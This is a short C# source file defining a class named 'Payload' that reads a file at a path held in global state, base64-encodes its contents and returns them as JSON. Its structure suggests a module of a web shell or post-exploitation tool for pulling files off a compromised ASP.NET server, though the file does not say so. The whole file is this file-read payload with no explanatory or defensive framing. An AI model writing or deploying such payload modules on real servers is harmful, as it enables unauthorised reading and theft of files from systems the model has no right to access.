using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;

public class Payload{

    [DataContract]
    class Ret {

        [DataMember]
        public int code = 0;

        [DataMember]
        public string msg="";
    }
    Ret ret;
    public string Run(){
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        if(File.Exists(Global.path)){
            ret.msg = Convert.ToBase64String(File.ReadAllBytes(Global.path));
            ret.code = 1;
        }
        return Global.json_encode(ret);
    }
}